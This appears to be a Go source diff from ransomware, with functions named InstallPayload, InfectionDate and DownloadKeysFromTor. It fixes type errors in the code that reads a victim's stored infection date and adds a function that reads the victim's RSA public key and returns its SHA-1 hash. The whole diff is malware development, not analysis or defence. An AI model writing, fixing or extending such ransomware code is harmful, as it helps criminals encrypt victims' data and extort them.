@@ -25,14 +25,14 @@ func InstallPayload() error {
     return nil
 }
 
+// Register infection date.
 func InfectionDate() (time.Time, error) {
-    // register infection date
+    var t time.Time
     f, err := os.Open(victimInfectionDate)
     if err != nil {
-        return false, errors.Wrap(pkg, "failed to open infection date file", err)
+        return t, errors.Wrap(pkg, "failed to open infection date file", err)
     }
     defer f.Close()
-    var t time
     err = gob.NewDecoder(bufio.NewReader(f)).Decode(&t)
     return t, errors.WrapIfNotNil(pkg, "failed to decode time", err)
 }
@@ -133,6 +133,14 @@ func DownloadKeysFromTor() error {
     }
 
     return nil
+}
+
+func ImportSha1PublicKey() (string, error) {
+    pkData, err := ioutil.ReadFile(victimPublicKey)
+    if err != nil {
+        return "", errors.Wrap(pkg, "failed to read RSA public key", err)
+    }
+    return util.Sha1Digest(pkData), nil
 }
 
 func ImportPublicKey() (*rsa.PublicKey, error) {
